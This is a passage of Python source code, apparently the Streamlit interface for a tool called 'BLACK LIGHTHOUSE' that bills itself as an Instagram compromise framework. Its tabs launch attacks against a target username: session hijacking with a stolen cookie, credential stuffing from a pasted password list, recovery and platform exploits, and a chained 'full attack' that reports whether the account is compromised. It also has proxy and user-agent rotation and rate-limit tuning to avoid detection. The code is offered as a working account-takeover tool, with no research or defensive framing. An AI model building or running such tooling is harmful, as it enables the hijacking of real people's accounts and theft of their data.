        font-family: monospace;
    }
    .stTextArea > div > div > textarea {
        background: #0d0d0d;
        color: #00ff41;
        border: 1px solid #333;
        font-family: monospace;
    }
    .stSelectbox > div > div > select {
        background: #0d0d0d;
        color: #00ff41;
        border: 1px solid #333;
    }
    .stMetric > div {
        background: #0d0d0d;
        padding: 10px;
        border-radius: 4px;
        border: 1px solid #1a1a1a;
    }
    .stTabs [data-baseweb="tab-list"] {
        gap: 2px;
    }
    .stTabs [data-baseweb="tab"] {
        background: #0d0d0d;
        color: #00ff41;
        border: 1px solid #1a1a1a;
        border-radius: 4px 4px 0 0;
        padding: 8px 16px;
    }
    .stTabs [aria-selected="true"] {
        background: #1a1a1a;
        border-bottom: 2px solid #00ff41;
    }
    .stCodeBlock {
        background: #0d0d0d !important;
        border: 1px solid #1a1a1a !important;
        border-radius: 4px !important;
    }
    </style>
    """, unsafe_allow_html=True)

    st.title("⚡ BLACK LIGHTHOUSE")
    st.caption("Full-Spectrum Instagram Compromise Framework — Evidence-Based | Production-Grade")

    if "orchestrator" not in st.session_state:
        st.session_state.orchestrator = AttackOrchestrator()

    # Sidebar
    with st.sidebar:
        st.subheader("⚙️ Control Panel")
        if st.button("🔄 Reset Framework"):
            st.session_state.orchestrator = AttackOrchestrator()
            st.success("Framework reset")

        st.divider()
        st.subheader("📈 Session Stats")
        client = st.session_state.orchestrator.client
        stats = {
            "Requests": client.state.request_count,
            "Device ID": client.state.device_id[:16] + "...",
            "CSRF": client.state.csrf_token[:10] + "..." if client.state.csrf_token else "None"
        }
        for k, v in stats.items():
            st.metric(k, v)

        st.divider()
        st.subheader("🌐 Proxy Settings")
        proxy_enabled = st.checkbox("Enable Proxy", value=CONFIG.proxy_enabled)
        if proxy_enabled != CONFIG.proxy_enabled:
            CONFIG.proxy_enabled = proxy_enabled
            os.environ["BL_PROXY_ENABLED"] = str(proxy_enabled).lower()
            # Reload proxies immediately
            client.ip_rotator._load_proxies()
            st.rerun()

        proxy_file = st.text_input("Proxy List File", value=CONFIG.proxy_list_file)
        if proxy_file != CONFIG.proxy_list_file:
            CONFIG.proxy_list_file = proxy_file
            client.ip_rotator._load_proxies()
            st.rerun()

        st.divider()
        st.subheader("📁 Results")
        if st.button("📂 Open Results Directory"):
            st.info(f"Results stored in: {CONFIG.results_dir}")

    # Main tabs
    tabs = st.tabs(["🎯 Targeted Attack", "🔗 Full Chain", "📊 Results", "📋 Audit Log", "⚡ Advanced"])

    with tabs[0]:
        col1, col2 = st.columns([1, 1])
        with col1:
            target = st.text_input("Target Username", placeholder="Enter Instagram username")
            attack_type = st.selectbox(
                "Attack Module",
                ["Session Hijack", "Credential Stuffing", "Recovery Exploit", "Platform Exploit"]
            )
        with col2:
            if attack_type == "Session Hijack":
                session_cookie = st.text_input("Session Cookie", type="password", placeholder="sessionid=...")
                if st.button("🚀 Execute Session Hijack"):
                    if target and session_cookie:
                        with st.spinner("Executing session hijack..."):
                            result = st.session_state.orchestrator.execute_module(
                                target, "session_hijack", session_cookie=session_cookie
                            )
                            st.session_state["last_result"] = result.to_dict()
                            st.json(st.session_state["last_result"])

            elif attack_type == "Credential Stuffing":
                password_list = st.text_area("Password List (one per line)", height=150)
                max_attempts = st.number_input("Max Attempts", min_value=10, max_value=500, value=200)
                if st.button("🚀 Execute Credential Stuffing"):
                    if target and password_list:
                        passwords = [p.strip() for p in password_list.split("\n") if p.strip()]
                        with st.spinner(f"Testing {len(passwords)} passwords..."):
                            result = st.session_state.orchestrator.execute_module(
                                target, "credential_stuffing", passwords=passwords, max_attempts=max_attempts
                            )
                            st.session_state["last_result"] = result.to_dict()
                            st.json(st.session_state["last_result"])

            elif attack_type == "Recovery Exploit":
                if st.button("🚀 Execute Recovery Exploit"):
                    if target:
                        with st.spinner("Testing recovery mechanisms..."):
                            result = st.session_state.orchestrator.execute_module(
                                target, "recovery_exploit"
                            )
                            st.session_state["last_result"] = result.to_dict()
                            st.json(st.session_state["last_result"])

            else:  # Platform Exploit
                if st.button("🚀 Execute Platform Exploit"):
                    if target:
                        with st.spinner("Scanning for vulnerabilities..."):
                            result = st.session_state.orchestrator.execute_module(
                                target, "platform_exploit"
                            )
                            st.session_state["last_result"] = result.to_dict()
                            st.json(st.session_state["last_result"])

    with tabs[1]:
        st.subheader("🚀 Full Attack Chain")
        st.info("Executes all modules sequentially (safe and thread‑free)")

        col3, col4 = st.columns([1, 1])
        with col3:
            chain_target = st.text_input("Target Username", key="chain_target")
            chain_passwords = st.text_area("Password List (optional)", height=100, key="chain_passwords")
        with col4:
            chain_session = st.text_input("Session Cookie (optional)", type="password", key="chain_session")
            chain_max_passwords = st.number_input("Max Passwords", min_value=10, max_value=500, value=200)

        if st.button("⚡ Execute Full Chain"):
            if chain_target:
                pass_list = [p.strip() for p in chain_passwords.split("\n") if p.strip()] if chain_passwords else None
                with st.spinner("Executing full attack chain..."):
                    result = st.session_state.orchestrator.execute_full_chain(
                        chain_target,
                        session_cookie=chain_session if chain_session else None,
                        passwords=pass_list,
                        max_passwords=chain_max_passwords
                    )
                    st.session_state["full_result"] = result

                summary = result["summary"]
                col5, col6, col7, col8, col9 = st.columns(5)
                col5.metric("✅ Confirmed", summary["confirmed"])
                col6.metric("⚡ Potential", summary["potential"])
                col7.metric("🔄 Partial", summary["partial"])
                col8.metric("❓ Inconclusive", summary["inconclusive"])
                col9.metric("❌ Failed", summary["failed"])

                st.success("✅ COMPROMISED" if result["compromised"] else "❌ Not Compromised")
                st.json(result)

    with tabs[2]:
        st.subheader("📊 Attack Results")
        if "last_result" in st.session_state:
            with st.expander("Last Single Attack", expanded=True):
                st.json(st.session_state["last_result"])
        if "full_result" in st.session_state:
            with st.expander("Full Chain Attack", expanded=True):
                st.json(st.session_state["full_result"])
        if st.button("Clear Results"):
            for key in ["last_result", "full_result"]:
                st.session_state.pop(key, None)
            st.rerun()

    with tabs[3]:
        st.subheader("📋 Audit Log")
        logs = st.session_state.orchestrator.get_audit_log()
        if logs:
            for log in logs[-20:]:
                st.code(json.dumps(log, indent=2))
        else:
            st.info("No logs yet")
        if st.button("Clear Audit Log"):
            st.session_state.orchestrator.audit_log = []
            st.rerun()

    with tabs[4]:
        st.subheader("⚡ Advanced Settings")

        col10, col11 = st.columns(2)

        with col10:
            st.markdown("**Rate Limiting**")
            max_req = st.number_input("Max Requests/Min", min_value=5, max_value=100, value=CONFIG.max_requests_per_minute)
            if max_req != CONFIG.max_requests_per_minute:
                CONFIG.max_requests_per_minute = max_req

            backoff = st.number_input("Rate Limit Backoff (seconds)", min_value=10, max_value=300, value=CONFIG.rate_limit_backoff)
            if backoff != CONFIG.rate_limit_backoff:
                CONFIG.rate_limit_backoff = backoff

            max_retries = st.number_input("Max Retries", min_value=1, max_value=10, value=CONFIG.max_retries)
            if max_retries != CONFIG.max_retries:
                CONFIG.max_retries = max_retries

            session_refresh = st.number_input("Session Refresh Interval (seconds)", min_value=60, max_value=600, value=CONFIG.session_refresh_interval)
            if session_refresh != CONFIG.session_refresh_interval:
                CONFIG.session_refresh_interval = session_refresh

        with col11:
            st.markdown("**User Agents**")
            ua_count = len(CONFIG.user_agents)
            st.metric("User Agents Loaded", ua_count)

            if st.button("Reload User Agents"):
                # Reload from default list (could be extended to read from file)
                # For now, just reload the default list from CONFIG.
                st.success(f"Reloaded {len(CONFIG.user_agents)} user agents")

            st.markdown("**Proxies**")
            proxy_count = len(st.session_state.orchestrator.client.ip_rotator.proxies)
            st.metric("Proxies Loaded", proxy_count)

            new_proxy = st.text_input("Add Proxy", placeholder="http://user:pass@host:port")
            if st.button("Add Proxy"):
                if new_proxy:
                    st.session_state.orchestrator.client.ip_rotator.add_proxy(new_proxy)
                    st.success(f"Added proxy: {new_proxy}")

        st.divider()
        if st.button("Apply All Settings"):
            st.success("Settings applied")
            st.info("Some settings may require a framework reset to take full effect")


# ---------------------------- Entry Point ----------------------------
if __name__ == "__main__":
    render_ui()